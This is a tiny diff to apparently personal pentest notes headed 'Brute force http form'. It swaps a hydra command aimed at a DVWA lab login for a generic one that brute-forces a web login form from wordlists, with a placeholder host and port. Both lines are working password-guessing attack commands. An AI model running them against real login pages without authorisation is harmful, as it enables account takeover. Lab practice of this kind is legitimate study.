@@ -1,3 +1,3 @@
 # Brute force http form
 
-  $ hydra -l admin -P pass.txt 192.168.71.129 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"
+$ hydra -L password.lst -P password.lst IP_AQUI -s PORT -v http-post-form "/:username=^USER^&password=^PASS^&Login=Login:Your Login Name or Password is invalid"
